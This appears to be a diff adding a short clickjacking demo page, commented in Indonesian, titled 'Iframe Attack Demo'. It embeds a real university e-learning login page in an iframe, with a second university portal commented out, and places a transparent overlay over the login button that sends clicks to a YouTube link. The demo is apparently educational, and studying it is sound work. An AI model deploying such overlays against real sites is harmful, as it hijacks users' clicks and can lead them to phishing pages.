@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iframe Attack Demo</title>
+    <style>
+        .overlay {
+            position: absolute;
+            top: 320px;  /* Sesuaikan dengan posisi tombol "MASUK" */
+            left: 75%;
+            width: 80px; /* Sesuaikan ukuran tombol */
+            height: 30px;
+            background: rgba(255, 0, 0, 0.2); /* Warna transparan untuk debugging */
+            /*background: rgba(243, 243, 243, 0.2);*/
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <!-- Menampilkan halaman e-class UKDW dalam iframe -->
+    <iframe src="https://eclass.ukdw.ac.id/e-class/id/" width="100%" height="600"></iframe>
+
+    <!-- <iframe src="https://simaster.ugm.ac.id/" width="100%" height="600"></iframe> -->
+
+    <!-- Overlay yang menutupi tombol "MASUK" -->
+    <div class="overlay" onclick="window.location='https://youtu.be/xvFZjo5PgG0?si=-tjg-iO8GAqc5FqW'"></div>
+</body>
+</html>
